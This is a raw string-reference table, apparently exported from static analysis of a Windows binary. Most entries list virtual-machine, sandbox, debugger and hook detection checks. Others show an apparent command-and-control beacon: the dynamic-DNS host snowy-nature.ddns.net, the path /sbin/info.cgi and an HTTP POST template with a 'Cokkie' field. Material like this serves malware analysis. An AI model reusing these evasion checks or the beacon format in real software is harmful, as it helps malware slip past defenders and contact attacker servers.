reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x403b28	0x40e258	string	0x40312b	C:\WINDOWS\system32\drivers\VBoxGuest.sys
0x403b32	0x40e284	string	0x40312b	C:\WINDOWS\system32\drivers\VBoxSF.sys
0x403b3c	0x40e2ac	string	0x40312b	C:\WINDOWS\system32\drivers\VBoxVideo.sys
0x403b6e	0x40e2d8	string	0x40312b	VirtualBox traced using driver file %s
0x403bbc	0x40d85a	string	0x40312b	TRUE\n
0x403be1	0x40d806	string	0x40312b	FALSE\n
0x403c04	0x40e300	string	0x40312b	[*] Detect by additional system files vbox* x 14 ...
0x403c72	0x40e338	string	0x40312b	C:\WINDOWS\system32\vboxdisp.dll
0x403c7b	0x40e35c	string	0x40312b	C:\WINDOWS\system32\vboxhook.dll
0x403c85	0x40e380	string	0x40312b	C:\WINDOWS\system32\vboxmrxnp.dll
0x403c8f	0x40e3a4	string	0x40312b	C:\WINDOWS\system32\vboxogl.dll
0x403c99	0x40e3c4	string	0x40312b	C:\WINDOWS\system32\vboxoglarrayspu.dll
0x403ca3	0x40e3ec	string	0x40312b	C:\WINDOWS\system32\vboxoglcrutil.dll
0x403cad	0x40e414	string	0x40312b	C:\WINDOWS\system32\vboxoglerrorspu.dll
0x403cb7	0x40e43c	string	0x40312b	C:\WINDOWS\system32\vboxoglfeedbackspu.dll
0x403cc1	0x40e468	string	0x40312b	C:\WINDOWS\system32\vboxoglpackspu.dll
0x403ccb	0x40e490	string	0x40312b	C:\WINDOWS\system32\vboxoglpassthroughspu.dll
0x403cd5	0x40e4c0	string	0x40312b	C:\WINDOWS\system32\vboxservice.exe
0x403cdf	0x40e4e4	string	0x40312b	C:\WINDOWS\system32\vboxtray.exe
0x403ce9	0x40e508	string	0x40312b	C:\WINDOWS\system32\VBoxControl.exe
0x403cf3	0x40e52c	string	0x40312b	C:\program files\oracle\virtualbox guest additions\
0x403d25	0x40e560	string	0x40312b	VirtualBox traced using system file %s
0x403d73	0x40d85a	string	0x40312b	TRUE\n
0x403d98	0x40d806	string	0x40312b	FALSE\n
0x403dbb	0x40e588	string	0x40312b	[*] Detect by checking MAC address starting with 08:00:27 ...
0x403dde	0x40e5c8	string	0x40312b	[*] Detect by looking for pseudo devices VBox* x4 ...
0x403e4c	0x40e601	string	0x40312b	\\.\VBoxMiniRdrDN
0x403e55	0x40e613	string	0x40312b	\\.\pipe\VBoxMiniRdDN
0x403e5f	0x40e629	string	0x40312b	\\.\VBoxTrayIPC
0x403e69	0x40e639	string	0x40312b	\\.\pipe\VBoxTrayIPC
0x403ed8	0x40e650	string	0x40312b	VirtualBox traced using device %s
0x403f2a	0x40d85a	string	0x40312b	TRUE\n
0x403f4f	0x40d806	string	0x40312b	FALSE\n
0x403f72	0x40e674	string	0x40312b	[*] Detect by looking for VBoxTray windows ...
0x403f86	0x40e6a6	string	0x40312b	VBoxTrayToolWndClass
0x403f9a	0x40e6bb	string	0x40312b	VBoxTrayToolWnd
0x403fd9	0x40d85a	string	0x40312b	TRUE\n
0x403ffe	0x40d806	string	0x40312b	FALSE\n
0x404021	0x40e6cc	string	0x40312b	[*] Detect by looking for VBox processes (vboxservice.exe, vboxtray.exe) ...
0x404077	0x40d806	string	0x40312b	FALSE\n
0x4040c6	0x40d806	string	0x40312b	FALSE\n
0x4040d2	0x40e71c	string	0x40312b	vboxservice.exe
0x40410b	0x40d85a	string	0x40312b	TRUE\n
0x40411b	0x40e72c	string	0x40312b	vboxtray.exe
0x404154	0x40d85a	string	0x40312b	TRUE\n
0x4041a1	0x40d806	string	0x40312b	FALSE\n
0x4041c4	0x40e588	string	0x40312b	[*] Detect by checking MAC address starting with 08:00:27 ...
0x4041f8	0x40d85a	string	0x40312b	TRUE\n
0x40421d	0x40d806	string	0x40312b	FALSE\n
0x404240	0x40e740	string	0x40312b	[*] Detect by checking VBox network is sharing with VirtualBox Shared Folders ...
0x4042c2	0x40e793	string	0x40312b	VirtualBox Shared Folders
0x4042f2	0x40d85a	string	0x40312b	TRUE\n
0x404317	0x40d806	string	0x40312b	FALSE\n
0x40433a	0x40e7ad	string	0x40312b	[-] VMware detection\n
0x40435d	0x40e7c4	string	0x40312b	[*] Reg key Scsi identifier is VMWARE ...
0x404369	0x40e7f1	string	0x40312b	VMWARE
0x404371	0x40dc70	string	0x40312b	Identifier
0x404379	0x40dc7c	string	0x40312b	HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0
0x404391	0x40e7f1	string	0x40312b	VMWARE
0x404399	0x40dc70	string	0x40312b	Identifier
0x4043a1	0x40e7f8	string	0x40312b	HARDWARE\DEVICEMAP\Scsi\Scsi Port 1\Scsi Bus 0\Target Id 0\Logical Unit Id 0
0x4043b9	0x40e7f1	string	0x40312b	VMWARE
0x4043c1	0x40dc70	string	0x40312b	Identifier
0x4043c9	0x40e848	string	0x40312b	HARDWARE\DEVICEMAP\Scsi\Scsi Port 2\Scsi Bus 0\Target Id 0\Logical Unit Id 0
0x4043f8	0x40d85a	string	0x40312b	TRUE\n
0x40441d	0x40d806	string	0x40312b	FALSE\n
0x404440	0x40e898	string	0x40312b	[*] Reg key (HKLM\SOFTWARE\VMware, Inc.\VMware Tools) ...
0x40444c	0x40e8d8	string	0x40312b	SOFTWARE\VMware, Inc.\VMware Tools
0x40447b	0x40d85a	string	0x40312b	TRUE\n
0x4044a0	0x40d806	string	0x40312b	FALSE\n
0x4044c3	0x40e8fc	string	0x40312b	[*] Detect by looking for C:\WINDOWS\system32\drivers\vmmouse.sys ...
0x4044cf	0x40e948	string	0x40312b	C:\WINDOWS\system32\drivers\vmmouse.sys
0x4044f6	0x40d85a	string	0x40312b	TRUE\n
0x40451b	0x40d806	string	0x40312b	FALSE\n
0x40453e	0x40e970	string	0x40312b	[*] Detect by looking for C:\WINDOWS\system32\drivers\vmhgfs.sys ...
0x40454a	0x40e9b8	string	0x40312b	C:\WINDOWS\system32\drivers\vmhgfs.sys
0x404571	0x40d85a	string	0x40312b	TRUE\n
0x404596	0x40d806	string	0x40312b	FALSE\n
0x4045b9	0x40e9e0	string	0x40312b	[*] Detect by looking for pseudo devices x2 ...
0x404628	0x40ea13	string	0x40312b	\\.\HGFS
0x404634	0x40ea1c	string	0x40312b	\\.\vmci
0x4046af	0x40ea25	string	0x40312b	VMWare traced using device %s
0x4046e4	0x40d85a	string	0x40312b	TRUE\n
0x404717	0x40d806	string	0x40312b	FALSE\n
0x40473a	0x40ea44	string	0x40312b	[*] Detect by checking MAC address starting with 00:05:69 ...
0x40476e	0x40d85a	string	0x40312b	TRUE\n
0x404793	0x40d806	string	0x40312b	FALSE\n
0x4047b6	0x40ea88	string	0x40312b	[*] Detect by checking MAC address starting with 00:0C:29 ...
0x4047ea	0x40d85a	string	0x40312b	TRUE\n
0x40480f	0x40d806	string	0x40312b	FALSE\n
0x404832	0x40eacc	string	0x40312b	[*] Detect by checking MAC address starting with 00:1C:14 ...
0x404866	0x40d85a	string	0x40312b	TRUE\n
0x40488b	0x40d806	string	0x40312b	FALSE\n
0x4048ae	0x40eb10	string	0x40312b	[*] Detect by checking MAC address starting with 00:50:56 ...
0x4048e2	0x40d85a	string	0x40312b	TRUE\n
0x404907	0x40d806	string	0x40312b	FALSE\n
0x40492a	0x40eb54	string	0x40312b	[*] Detect by checking network adapter name is VMware...
0x404936	0x40eb8e	string	0x40312b	VMware
0x40495e	0x40d85a	string	0x40312b	TRUE\n
0x404983	0x40d806	string	0x40312b	FALSE\n
0x4049a6	0x40eb95	string	0x40312b	[-] Wine detection\n
0x4049c9	0x40ebac	string	0x40312b	[*] Using GetProcAddress() to check address of wine_get_unix_file_name func from kernel32.dll library ...
0x4049d5	0x40ec19	string	0x40312b	kernel32.dll
0x4049f5	0x40ec26	string	0x40312b	wine_get_unix_file_name
0x404a2b	0x40d85a	string	0x40312b	TRUE\n
0x404a50	0x40d806	string	0x40312b	FALSE\n
0x404a75	0x40d806	string	0x40312b	FALSE\n
0x404a98	0x40ec40	string	0x40312b	[*] Reg key (HKCU\SOFTWARE\Wine) ...
0x404aa4	0x40ec68	string	0x40312b	SOFTWARE\Wine
0x404ad3	0x40d85a	string	0x40312b	TRUE\n
0x404af8	0x40d806	string	0x40312b	FALSE\n
0x404b1b	0x40ec78	string	0x40312b	[-] Generic sandbox detection\n
0x404b3e	0x40ec98	string	0x40312b	[*] Using GetTickCount() to check if sleep has succeed
0x404b91	0x40ecd2	string	0x40312b	4500ms < %dms ... FALSE\n
0x404bb0	0x40ecec	string	0x40312b	4500ms > %dms ... TRUE\n
0x404bda	0x40ed04	string	0x40312b	[-] Debugger detection\n
0x404bfd	0x40ed1c	string	0x40312b	[*] Using OutputDebugString() to send strings to debugger ...
0x404c26	0x40ed5d	string	0x40312b	useless
0x404c5d	0x40d85a	string	0x40312b	TRUE\n
0x404c82	0x40d806	string	0x40312b	FALSE\n
0x404ca5	0x40ed68	string	0x40312b	but only works on MS Windows systems prior to Vista see "https://msdn.microsoft.com/ja-jp/library/cc428973.aspx" for more info \n
0x404cc8	0x40edf0	string	0x40312b	[-] Hooks detection\n
0x404cf5	0x40ee08	string	0x40312b	[*] Detect by tracing hooks using DeleteFileW method ...
0x404d34	0x40d85a	string	0x40312b	TRUE\n
0x404d59	0x40d806	string	0x40312b	FALSE\n
0x404d7c	0x40ee44	string	0x40312b	[*] Detect by tracing hooks using ShellExecuteExW method ...
0x404dbb	0x40d85a	string	0x40312b	TRUE\n
0x404de0	0x40d806	string	0x40312b	FALSE\n
0x404e03	0x40ee84	string	0x40312b	[*] Detect by tracing hooks using CreateProcessA method ...
0x404e42	0x40d85a	string	0x40312b	TRUE\n
0x404e67	0x40d806	string	0x40312b	FALSE\n
0x404e8a	0x40eec3	string	0x40312b	[-] Bochs detection\n
0x404ead	0x40eed8	string	0x40312b	[*] Reg key (HKLM\HARDWARE\Description\System "SystemBiosVersion") is BOCHS ...
0x404eb9	0x40ef2b	string	0x40312b	BOCHS
0x404ec1	0x40dd22	string	0x40312b	SystemBiosVersion
0x404ec9	0x40dd34	string	0x40312b	HARDWARE\Description\System
0x404ef8	0x40d85a	string	0x40312b	TRUE\n
0x404f1d	0x40d806	string	0x40312b	FALSE\n
0x404f40	0x40ef34	string	0x40312b	[*] Detect by proccessor brand name is P (CPU AMD value is wrong) ...
0x404f62	0x40ef7d	string	0x40312b	AMD Athlon(tm) processor
0x404f93	0x40d85a	string	0x40312b	TRUE\n
0x404fb8	0x40d806	string	0x40312b	FALSE\n
0x404fdb	0x40ef98	string	0x40312b	[*] Detect by easter egg is wrong (CPU AMD value is wrong) ...
0x40502c	0x40d85a	string	0x40312b	TRUE\n
0x405051	0x40d806	string	0x40312b	FALSE\n
0x405074	0x40efdc	string	0x40312b	[*] Detect by INTEL CPU processor is Intel(R) Pentium(R) 4 CPU ...
0x405096	0x40f024	string	0x40312b	Intel(R) Pentium(R) 4 CPU
0x4050c7	0x40d85a	string	0x40312b	TRUE\n
0x4050ec	0x40d806	string	0x40312b	FALSE\n
0x40510f	0x40f054	string	0x40312b	[-] CPU detection\n
0x405156	0x40f067	string	0x40312b	%lu.%lu build %lu
0x40519a	0x40f079	string	0x40312b	Windows version: %s\n
0x4051c1	0x40f095	string	0x40312b	CPU: %s %s \n
0x4051de	0x40f0a9	string	0x40312b	Windows version: %s
0x405210	0x40f0bd	string	0x40312b	CPU: %s %s
0x405245	0x40f0c8	string	0x40312b	[*] Detect by checking the difference between CPU timestamp counters (rdtsc: Read Time Stamp Counter)
0x4052ab	0x40ab10	string	0x40312b	UWVS
0x4052e5	0x40f131	string	0x40312b	0 < %d < 750 ... FALSE\n
0x405316	0x40f149	string	0x40312b	0 > %d || 750 < %d ... TRUE\n
0x405340	0x40f168	string	0x40312b	[*] Detect by checking the difference between CPU timestamp counters (rdtsc: Read Time Stamp Counter) forcing VM exit ...
0x4053a6	0x40ab10	string	0x40312b	UWVS
0x4053e0	0x40f1e5	string	0x40312b	0 < %d < 1000 ... FALSE\n
0x405411	0x40f1fe	string	0x40312b	0 > %d || 1000 < %d ... TRUE\n
0x40543b	0x40f21c	string	0x40312b	[*] Detect by checking hypervisor bit in cpuid feature bits ...
0x405476	0x40d85a	string	0x40312b	TRUE\n
0x40549b	0x40d806	string	0x40312b	FALSE\n
0x4054be	0x40f260	string	0x40312b	[*] Detect by checking cpuid vendor is KVM || Hv || VMware || Xen ...
0x405533	0x40f2a9	string	0x40312b	KVMKVMKVMKVM
0x40553f	0x40f2b6	string	0x40312b	Microsoft Hv
0x40554c	0x40f2c3	string	0x40312b	VMwareVMware
0x405559	0x40f2d0	string	0x40312b	XenVMMXenVMM
0x4055b8	0x40d85a	string	0x40312b	TRUE\n
0x4055f4	0x40d806	string	0x40312b	FALSE\n
0x40567f	0x40da15	string	0x40312b	.\Pisces.txt
0x4057f6	0x40f2dd	string	0x40576f	WSAStartup Failed.
0x405811	0x40d03a	string	0x40576f	snowy-nature.ddns.net
0x405822	0x40d03a	string	0x40576f	snowy-nature.ddns.net
0x40583c	0x40f2f0	string	0x40576f	NXdomain
0x40595b	0x40d024	string	0x40576f	230004
0x405963	0x40d02b	string	0x40576f	/sbin/info.cgi
0x40596b	0x40d03a	string	0x40576f	snowy-nature.ddns.net
0x405973	0x40d03a	string	0x40576f	snowy-nature.ddns.net
0x40597b	0x40d02b	string	0x40576f	/sbin/info.cgi
0x405983	0x40d050	string	0x40576f	POST %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)\r\nReferer: http://%s%s\r\nCokkie: xtl_s=%s\r\nContent-Length: 207\r\n\r\n
0x405a1b	0x40f2fa	string	0x40576f	Basic realm=
0x405a9e	0x40d024	string	0x40576f	230004
0x405aa6	0x40d02b	string	0x40576f	/sbin/info.cgi
0x405aae	0x40d03a	string	0x40576f	snowy-nature.ddns.net
0x405ab6	0x40d03a	string	0x40576f	snowy-nature.ddns.net
0x405abe	0x40d02b	string	0x40576f	/sbin/info.cgi
0x405ac6	0x40f30c	string	0x40576f	POST %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)\r\nReferer: http://%s%s\r\nCokkie: xtl_s=%s\r\nContent-Length: 207\r\n
0x405c7b	0x40f3a2	string	0x40576f	tws_action=%s&
